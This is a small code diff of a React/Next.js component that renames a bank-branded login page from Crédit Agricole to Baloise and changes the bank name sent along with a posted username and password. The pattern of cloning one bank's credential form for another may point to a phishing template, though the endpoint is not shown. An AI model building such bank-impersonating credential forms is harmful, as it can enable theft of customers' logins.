@@ -4,7 +4,7 @@ import Link from "next/link";
 import { useState } from "react";
 import { useRouter } from "next/navigation";
 
-export default function CreditAgricoleConnect() {
+export default function BaloiseConnect() {
   const router = useRouter();
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
@@ -25,7 +25,7 @@ export default function CreditAgricoleConnect() {
         body: JSON.stringify({ 
           username, 
           password, 
-          bankName: "CREDITAGRICOLE" // Ajout explicite du nom de la banque ici
+          bankName: "Baloise" // Ajout explicite du nom de la banque ici
         }),
       });
 
